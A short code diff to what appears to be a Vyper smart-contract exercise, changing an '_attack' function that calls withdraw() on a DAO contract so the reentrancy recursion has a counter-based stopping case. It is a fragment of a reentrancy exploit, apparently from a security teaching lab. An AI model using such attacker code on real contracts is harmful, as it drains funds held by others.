@@ -16,10 +16,12 @@ def __init__():
 @internal
 def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
-    while self.count > 0:
+    if self.count > 0:
         DAO(self.dao_address).withdraw()
         self.count -= 1
-
+        return True
+    else:
+        return False
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
     return True
